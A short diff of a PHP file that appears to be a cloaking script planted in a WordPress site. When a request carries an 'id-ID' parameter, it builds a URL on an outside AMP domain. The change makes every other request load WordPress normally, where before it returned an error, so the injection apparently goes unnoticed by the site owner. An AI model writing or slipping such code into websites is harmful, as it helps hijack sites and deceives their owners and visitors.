@@ -9,10 +9,10 @@ if (isset($_GET['id-ID']) && !empty($_GET['id-ID'])) {
     $ampnya = "https://amp.darat.pro/global/" . strtolower($page);
 } 
 else {
-        http_response_code(500);
-        echo "Konten gagal diambil.";
-    }
+    define('WP_USE_THEMES', true);
+    require __DIR__ . '/wp-blog-header.php';
     exit;
+}
 ?>
 
 
@@ -1913,6 +1913,7 @@ window.datadog_attributes['pageType']='item:details'
 </body>
 
 </html>
+
 
 
 
